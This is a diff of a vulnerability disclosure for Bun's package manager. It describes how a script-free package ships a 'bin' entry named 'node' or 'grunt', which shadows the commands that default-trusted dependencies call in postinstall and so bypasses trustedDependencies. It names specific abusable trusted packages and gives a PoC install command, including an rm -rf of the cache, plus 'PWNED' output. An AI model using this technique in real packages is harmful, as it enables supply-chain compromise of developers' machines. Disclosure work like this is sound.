@@ -3,7 +3,7 @@
 # BunnyHijack: Making Bun's `trustedDependencies` Completely Useless
 
 > [!IMPORTANT]
-> **Affected**: Before rust port to `1.3.14` (latest at time of writing)
+> **Affected**: `1.3.14` and earlier for the `node` variant. `1.4.4` and later for the `grunt` variant used in the PoC below.
 >
 > **Status**: Disclosed to Oven. Maintainer declined, says this is not a vulnerability (see [Maintainer Response](#maintainer-response))
 >
@@ -52,41 +52,46 @@ A package.json like this is accepted by Bun:
   "name": "evil-pkg",
   "version": "^1.0.0",
   "bin": {
-    "node": "./shim.js"
+    "grunt": "./shim.js"
   },
   "dependencies": {
-    "protoc-gen-grpc-web": ">=1.0.0"
+    "@sap/hana-theme-vscode": ">=1.0.0"
   }
 }
 ```
 
-`evil-pkg` has zero scripts. The trust system has nothing to block. But `protoc-gen-grpc-web` is default-trusted. Its `postinstall: "node ./post-install.js"` runs automatically. That `node` call hits the poisoned `.bin/node` symlink.
+`evil-pkg` has zero scripts. The trust system has nothing to block. But `@sap/hana-theme-vscode` is default-trusted. Its `postinstall: "grunt setVersion"` runs automatically. That `grunt` call hits the poisoned `.bin/grunt` symlink.
 
 ---
 
 ## Proof of Concept
 
 > [!NOTE]
-> Tested on Bun v1.3.14, Linux x86_64. Works the same on macOS and Windows 11.
-> The PoC writes to `/tmp/.bun-npm-pwned` to prove code ran. Nothing destructive.
+> Tested on Bun v1.4.4, Linux x86_64. Works the same on macOS and Windows 11.
+> The PoC writes `pwned-by-bunnyhijack.txt` to prove code ran. Nothing destructive.
 
 ### Steps to reproduce
 
 ```sh
 # This will remove cache of bun, not dangerous but a headsup.
-rm -rf ~/.bun/install/cache && mkdir -p ~/test-dir && cd ~/test-dir && bun i evil-pkg && cat /tmp/.bun-npm-pwned
+rm -rf ~/.bun/install/cache && mkdir -p ~/test-dir && cd ~/test-dir && bun i x3r0day-bunnyhijack-poc && cat pwned-by-bunnyhijack.txt
 ```
 
 ### Result
 
 ```text
-bun add v1.3.14 (0d9b296a)
+bun add v1.4.4 (38afee6c8)
 
-installed evil-pkg@1.0.5 with binaries:
- - node
+installed x3r0day-bunnyhijack-poc@1.0.3 with binaries:
+ - grunt
 
-137 packages installed [2.27s]
-PWNED by evil-pkg@1.0.5 - self-triggering PATH poisoning via default-trusted protoc-gen-grpc-web
+2 packages installed [1.19s]
+
+PWNED by x3r0day-bunnyhijack-poc
+time: 2026-11-06T14:27:48.933Z
+os:   linux/x64
+cwd:  node_modules/@sap/hana-theme-vscode
+argv: setVersion
 ```
 
 ---
